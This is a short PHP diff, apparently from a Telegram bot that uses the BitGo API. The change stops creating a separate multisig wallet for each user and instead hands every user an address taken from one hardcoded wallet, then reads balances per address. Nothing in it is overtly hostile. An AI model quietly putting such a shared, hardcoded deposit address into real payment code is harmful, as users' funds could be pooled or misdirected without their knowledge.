@@ -60,14 +60,14 @@ function post($url,$postdata){
 
 
 function newWallet($username){
-	$temp=post("https://www.bitgo.com/api/v1/wallet",['label'=>$username,'m'=>2,'n'=>3,'keychains'=>[['xpub'=>'xpub661MyMwAqRbcGJqvexUHEVce9aiRkYYBeAiZnDSjSGZ93jFMfpcSDp36RPgBF5N1W9hFXVJdBaSAwHWHr5zJ6NTQqKKLRzfKg1saoUPmd5T' ],['xpub'=>'xpub6GiRC55CSBpR3Lj2GRNGVxBj4r3fionThEEThPpvdMsPEafNArDvnnghKUuEARb1XZatVhc9oj21UddkKzmqbycxbzLsdFoBrw3LuVNzkmL'],['xpub'=>json_decode(post('https://www.bitgo.com/api/v1/keychain/bitgo',[]),true)['xpub']]]]);
-	return json_decode($temp,true)['id'];
+	//$temp=post("https://www.bitgo.com/api/v1/wallet",['label'=>$username,'m'=>2,'n'=>3,'keychains'=>[['xpub'=>'xpub661MyMwAqRbcGJqvexUHEVce9aiRkYYBeAiZnDSjSGZ93jFMfpcSDp36RPgBF5N1W9hFXVJdBaSAwHWHr5zJ6NTQqKKLRzfKg1saoUPmd5T' ],['xpub'=>'xpub6GiRC55CSBpR3Lj2GRNGVxBj4r3fionThEEThPpvdMsPEafNArDvnnghKUuEARb1XZatVhc9oj21UddkKzmqbycxbzLsdFoBrw3LuVNzkmL'],['xpub'=>json_decode(post('https://www.bitgo.com/api/v1/keychain/bitgo',[]),true)['xpub']]]]);
+    $address = json_decode(post("https://www.bitgo.com/api/v1/wallet/3PMAbkwc11nYDBteNgJXnxgUsXJJKCUzFp/address/0",[]),true)['address'];
+	return $address;
 }
 
 function yue($walletId){
-    $balance = json_decode(get("https://www.bitgo.com/api/v1/wallet/$walletId",[]),true)['balance'];
-    $address = json_decode(post("https://www.bitgo.com/api/v1/wallet/$walletId/address/0",[]),true)['address'];
-    return ['balance'=>$balance,'address'=>$address];
+    $balance = json_decode(get("https://www.bitgo.com/api/v1/address/$walletId",[]),true)['confirmedBalance'];
+    return ['balance'=>$balance,'address'=>$walletId];
 }
 function windowsinfo($chat_id,$title,$data,$button=false){
     $buttoninfo['chat_id']=$chat_id;
